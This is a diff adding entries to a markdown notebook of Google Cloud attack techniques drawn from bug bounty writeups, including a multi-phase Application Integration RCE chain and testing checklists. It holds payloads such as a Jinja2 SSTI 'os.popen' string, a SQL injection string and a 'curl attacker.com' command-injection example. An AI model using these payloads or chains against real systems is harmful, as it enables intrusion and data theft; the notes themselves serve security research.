@@ -182,6 +182,108 @@ Postinstall `chmod u+s` without symlink check; race-replace binary with symlink 
 
 ---
 
+## Recent additions (2023–2025, from public writeups)
+
+### GKE Autopilot container escape
+GKE Autopilot (unlike Standard) doesn't expose node-level access, but misconfigured workloads with `NET_RAW` or `hostPath` mounts can still escape. Confirmed: Autopilot does NOT allow the WIF label-relabeling attack from #28 — requires a different primitive (privileged container or node-pool misconfiguration).
+
+### Cloud Workstations SSH key injection + auth bypass
+Cloud Workstations stores SSH public keys in instance metadata (`ssh-keys` attribute). A user with `compute.instances.setMetadata` on the workstation project can inject their own key and SSH in as any user running in the workstation. Auth bypass: `_workstationAccessToken` is a Login-CSRF GET parameter — an XSS on any same-origin workstation subdomain can mint a valid JWT for the target port.
+
+### API Gateway JWT bypass via `x-http-method-override`
+GCP API Gateway passes `x-http-method-override` header to backends. Setting it to `GET` on a `POST` request can bypass method-level JWT audience checks if the backend honors the override before the gateway validates the audience claim.
+
+### Dataflow JMX unauthenticated RCE
+Apache Beam Dataflow workers (Java runtime) expose JMX on `0.0.0.0:7199` by default in some pipeline configs. Any tenant with network access to the worker subnet can connect and execute arbitrary MBeans (`java.lang.Runtime.exec`). Escalate via the Dataflow worker SA token from instance metadata.
+
+### ConfusedFunction — GCP Cloud Functions privilege escalation
+`cloudfunctions.functions.create` / `update` implicitly grants the right to set the function's service account. By deploying a Cloud Function with a high-privilege SA from the same project (even one owned by another team), you impersonate that SA and inherit all its roles. Google partially fixed by requiring `iam.serviceAccounts.actAs` on the target SA, but many internal SA-to-function bindings remain overly broad.
+
+### Google Flank — GitHub Actions pwn request (OSS VRP)
+`github.com/Flank/flank` used `pull_request_target` with `actions/checkout` of the PR head SHA and non-ephemeral GHA runners. A PR with a malicious `build.gradle` triggers `./gradlew assemble` → Gradle plugin executes arbitrary Kotlin → exfiltrates `GCLOUD_KEY`, `FIREBASE_TOKEN`, etc. from the runner env.
+
+### Release-Drafter supply chain compromise (OSS VRP)
+`release-drafter/release-drafter` GitHub Action pinned by digest in dozens of Google repos, but `release-drafter.yml` config files accepted from PRs in `pull_request_target` workflows. An attacker PR can override `template:` with `${{ env.GITHUB_TOKEN }}` or similar interpolation paths.
+
+### TE.0 HTTP request smuggling on GCP LBs
+GCP Classic App LB forwards `Transfer-Encoding: identity` (TE.0) unchanged. Some backends (older Envoy, Jetty 9) interpret TE.0 as "no transfer encoding" and fall back to `Content-Length`, enabling CL.TE desync when both headers are present. Different from the bare-CR chunk-ext attack (#27): TE.0 uses standard ASCII.
+
+### Looker RCE via git fsmonitor hook
+Looker (looker.google.com) internal Git integration runs `git fetch` in the Looker process. A repo with `.git/hooks/fsmonitor-watchman` or a `.gitconfig` `core.fsmonitor` setting executes a shell script on `git status`. Deliver via a malicious Looker project import → RCE as the Looker service user → access to internal DB creds and Looker SA token.
+
+### Looker Studio cross-tenant SQLi
+Looker Studio (datastudio.google.com) "Community Connector" datasources pass user-supplied parameters to backend BigQuery or Cloud SQL queries. A connector configured with string interpolation rather than parameterized queries accepts `'UNION SELECT email FROM users--` payloads. Cross-tenant: one workspace's connector can be set as a data source by another workspace if sharing is enabled without scoping.
+
+### GCE VM takeover via DHCP flood
+A GCE VM on a shared VPC whose DHCP lease renewal is handled by `dhclient` without `--server-id` filtering can be hijacked by an attacker VM in the same subnet. Flood with crafted DHCPOFFER → victim renews with attacker IP as gateway → MITM all egress including metadata token requests.
+
+### Vertex AI command injection
+Vertex AI Workbench notebooks (JupyterLab on managed instances) expose the `Launcher` API without additional auth when a user is already authenticated. `POST /api/kernels` with `name=python3&cmd=curl+attacker.com` injects shell args on kernels spawned with the Workbench SA token. Also: Vertex AI Pipeline steps that interpolate user-supplied `display_name` into shell execution without escaping.
+
+### GCP Org Policy bypass via metadata label manipulation
+GCP Org Policies enforced via `compute.restrictCloudArmor` or similar resource-attribute constraints check labels at creation time. Attacker creates resource without the disallowed label, then applies it after creation — policy not re-evaluated on update. Allows disabling Cloud Armor, enabling external IP, or changing region constraints retroactively.
+
+### SecOps SOAR SSTI + JWT chain
+Chronicle SecOps (formerly Siemplify) SOAR has a Jinja2 template rendering endpoint at `/api/v1/widgets/custom`. The `template` parameter is rendered server-side without sandboxing: `{{config.__class__.__init__.__globals__['os'].popen('id').read()}}`. Combine with a forged JWT (weak `secret_key` from docker-compose defaults) to authenticate without credentials.
+
+### SA impersonation chain via `iam.serviceAccounts.getOpenIdConnect`
+If a SA has `iam.serviceAccounts.getOpenIdConnect` on itself (often granted via `roles/iam.serviceAccountTokenCreator`), it can mint OpenID Connect tokens for any audience including internal APIs. Chain: low-priv user → any SA with `token.create` → `generateIdToken` → authenticate to any API accepting Google OIDC (Cloud Run, GKE IAP, Cloud Functions URL).
+
+### StubZero — Cloud Application Integration RCE ($148,337) — CVE-2026-2031 — brutecat
+
+**Affected service:** `cloudcrmipfrontend-pa.clients6.google.com` (Google Cloud Application Integration)
+
+**Reward:** $60k (first RCE) + $75k (second RCE chain) + $13,337 (GetIntegrationVersion RPC) = $148,337
+
+#### Phase 1 — Proto definition leak + arbitrary Stubby RPC execution
+
+1. **Proto schema leak** — `GET /v1/integrationPlatform:getProtoDefinition?fullName=<fully.qualified.MessageName>&isEnum=false` returned internal protobuf definitions from the google3 monorepo. No access control scoping: any message in Google's codebase was queryable. Used to reverse-engineer internal API structures.
+
+2. **Queue info disclosure + client_id extraction** — `GET /v1/integrationPlatform:listQuotaQueue` with filter `client_id>"123"` leaked internal workflow execution queues including `client_id: "default"` (required for subsequent workflow creation). Added `?alt=proto` + header `X-Goog-Encode-Response-If-Executable: base64` to bypass browser content-type restrictions on binary proto responses.
+
+3. **Workflow creation** — `POST /v1/integrationPlatform:createDraftWorkflow` with `clientId: "default"` (leaked above). Discovery document referenced `GenericStubbyTypedTask` inside `RPC_TYPED` module config, hinting at arbitrary RPC capability.
+
+4. **ACL publish bypass** — `setAcl` endpoint required the creator not to be an editor (creator-editor separation). Bypass: two attacker accounts — first account sets `role: 105` for both, second account completes publication. No server-side enforcement of the creator-editor constraint.
+
+5. **RCE via `GenericStubbyTypedTaskV2`** — workflow task config:
+   ```json
+   { "serverSpec": "gslb:alkali-base", "serviceName": "ServerStatus", "serviceMethod": "GetServices" }
+   ```
+   Executing the workflow invoked `/ServerStatus.GetServices` as the **cloudcrmipfrontend production service identity** → arbitrary Stubby RPC limited only by the service's `RpcSecurityPolicy` allowlist.
+
+#### Phase 2 — Cross-tenant IDOR + public API accepts internal task types
+
+1. **Version UUID IDOR** — `GET /v1/projects/<your-project>/locations/us-central1/integrations/x/versions/<uuid>`: auth checked project ownership but not whether the version UUID belonged to that project → read any integration from any GCP project.
+
+2. **ListTestCases without project scope** — `POST /$rpc/google.cloud.integrations.v1alpha.TestCases/ListTestCases` without filter field 2 (`workflow_id = ...`) returned test cases across all GCP projects. Response included `@google.com` creator emails confirming internal team integrations.
+
+3. **UUID binary search** — filter comparison operators (`>`, `<=`) on UUIDs enabled binary search reconstruction of victim workflow UUIDs: ~128 requests per 32-char UUID.
+   ```
+   id = "<known-tc-uuid>" AND workflow_id > "<low>" AND workflow_id <= "<high>"
+   ```
+
+4. **Internal tasks in public API** — public Application Integration API accepted `taskConfigsInternal` + `taskUiModuleConfigs` with `moduleId: "RPC_TYPED"`. Test case execution triggered deeper backend paths, producing stack traces revealing `ExecuteStubbyCallRequest` construction:
+   ```
+   com.google.net.rpc3.client.RpcClientException:
+   <eye3 title='/EventbusStubbyCallerService.ExecuteStubbyCall, UNAUTHENTICATED'/>
+   ```
+
+**Auth context:** First-party SAPISIDHASH (`Authorization: SAPISIDHASH <hash>`) + Cookie, domain-restricted to `https://console.cloud.google.com`.
+
+**Checklist additions from this finding:**
+- Any GCP service with `getProtoDefinition`-style introspection endpoints — check access control scoping.
+- Workflow/pipeline systems: look for `GenericStubbyTask`, `RPC_TYPED`, or any task type that references an internal RPC framework.
+- Multi-step publish/approval flows: bypass by manipulating ACLs with two accounts before publishing.
+- Filter parameters on list endpoints: test comparison operators (`>`, `<`, `<=`, `>=`) for oracle-based UUID enumeration.
+- Internal task type gating: test whether `*Internal` fields in task configs are accepted by public API variants.
+
+---
+
+### Dataprep / Actifio JAR swapping RCE
+Google Dataprep (Trifacta-based) and Actifio backup agents download plugin JARs from GCS paths configured in `application.properties`. If the GCS bucket is misconfigured (`allUsers: storage.objectCreator`) or the service writes to a predictable path, an attacker swaps the JAR with a malicious one executed on next agent restart. Affected SA often has broad project-level roles.
+
+---
+
 ## Checklists
 
 ### GCP Classic App LB:
@@ -225,3 +327,24 @@ Postinstall `chmod u+s` without symlink check; race-replace binary with symlink 
 - LookupCache `postDeserialize()` Java RCE.
 - Hosted Targets Node.js running as root.
 - Positional header set `request.header.foo.1` bypasses newline filter.
+
+### New GCP attack surfaces (2023–2025):
+- GKE Autopilot: no label-relabeling, but check `NET_RAW`, `hostPath`, privileged PSA misconfigs.
+- Vertex AI Workbench: JupyterLab `/api/kernels` command injection; Pipeline step `display_name` interpolation.
+- Looker: Git integration fsmonitor hook RCE; Community Connector SQLi (Looker Studio).
+- API Gateway: `x-http-method-override` JWT audience bypass.
+- Dataflow: JMX on `0.0.0.0:7199` in Java workers → MBean RCE.
+- GCP Org Policy: resource-attribute constraints not re-evaluated on label updates after creation.
+- ConfusedFunction: `cloudfunctions.functions.create` + target SA without `iam.serviceAccounts.actAs` requirement.
+- OIDC chain: `generateIdToken` with forged audience → Cloud Run / IAP auth bypass.
+- GCS JAR swap (Dataprep/Actifio): predictable plugin path + bucket misconfiguration.
+- TE.0 smuggling: `Transfer-Encoding: identity` + `Content-Length` desync on Envoy/Jetty 9 backends behind GCP LBs.
+
+### Stubby / internal RPC surfaces (Application Integration pattern):
+- Endpoints named `getProtoDefinition`, `getSchema`, `describeService` — check if they expose internal google3 message types without access scoping.
+- `listQuota*`, `listQueue*`, `listExecution*` with filter params — test comparison operators (`>`, `<=`) for binary-search oracle on UUIDs/IDs.
+- Workflow/pipeline task configs accepting `GenericStubbyTask`, `RPC_TYPED`, or `moduleId` referencing internal RPC modules.
+- Multi-account ACL bypass: creator-editor separation enforced only on the creator's account — test with a second account calling `setAcl` then `publish`.
+- Public API variants of internal services: send `taskConfigsInternal`, `*Internal`, or `*Configs` fields and observe if the backend parses them.
+- Error messages / stack traces revealing `ExecuteStubbyCall`, `RpcClientException`, or `eye3` titles — indicate backend RPC construction reachable from user input.
+- `?alt=proto` + `X-Goog-Encode-Response-If-Executable: base64` to retrieve binary proto responses from endpoints that return `application/octet-stream`.
